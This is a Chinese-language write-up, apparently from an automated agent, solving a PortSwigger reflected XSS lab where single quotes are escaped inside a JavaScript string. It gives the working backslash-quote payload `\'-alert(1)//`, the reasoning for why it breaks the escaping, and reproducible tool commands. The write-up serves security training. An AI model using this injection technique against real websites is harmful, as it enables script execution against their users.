# lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped (arm A)

- 题：Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
- 实例：https://0a0900f203a42c0981fc703e005400e0.web-security-academy.net/（reused:false，无 exploit server）
- 判定：solved（banner `Congratulations, you solved the lab!`）；反射点 `/?search=` 进内联脚本的 JS 单引号串
- 载荷：`search=\'-alert(1)//`（URL 形 `%5C%27-alert(1)//`）

## 关键步

1. `page_read` 题页取 widget-lab-id `1bf4b925…9d63`（canonical 路径 200，无需回退 /api/widgets）
2. `range_launch launch-url <题页路径> --jar /tmp/cj1.json` → instance_url，reused:false，exploit_server:null
3. 上下文取证：http_session 剥 script 块（3689→3405），改走 CDP 读活 DOM
   `browser_suite goto ...?search=marker9137` + `eval Array.from(document.scripts).map(s=>s.textContent)`
   得原文 `var searchTerms = 'marker9137';` + 一行 `document.write('<img src="…tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">')`
   ⇒ 输出面是单引号字符串，服务端只转义 `'`→`\'`，反斜杠本身不再转义
4. 破坏转义：输入 `\` + `'` 经服务端输出为 `\\'`，JS 读作「转义反斜杠 + 收串」⇒ 闭合字符串，尾部 `//` 注释残余
5. `page_alert '<instance>/?search=%5C%27-alert(1)//'` → `{"alerts":["alert:1"],"fired":true}`
6. `banner_verdict <instance>/ --jar /tmp/cj1.json` → `solved:true`，`solved_class:true`

## 证据摘录

- `page_alert`: `{"alerts":["alert:1"],"fired":true,"ready_state":"complete"}`
- `banner_verdict`: `{"congrats_line":"<h4>Congratulations, you solved the lab!</h4>","solved":true,"solved_class":true}`

## 可复现命令

```
rs page_read https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped --out /tmp/jsstr1.html --jar /tmp/cj1.json
rs range_launch launch-url <同上路径> --jar /tmp/cj1.json
rs browser_suite goto '<instance>/?search=marker9137'
rs browser_suite eval "Array.from(document.scripts).map(s=>s.textContent).join('\n===\n')"
rs page_alert '<instance>/?search=%5C%27-alert(1)//'
rs banner_verdict <instance>/ --jar /tmp/cj1.json
```

## 要点

- 该族（单引号串 + 单引号转义）的破口是「转义符本身未被再转义」：冗余反斜杠吞掉转义，`'` 复位为收串符。
- http_session 剥离 `<script>`，JS 上下文取证必须走 CDP 读活 DOM 或 raw_http 落盘。
- 一次 `page_alert` 闭环：载荷页面加载即内联执行，无需交互与交付面。
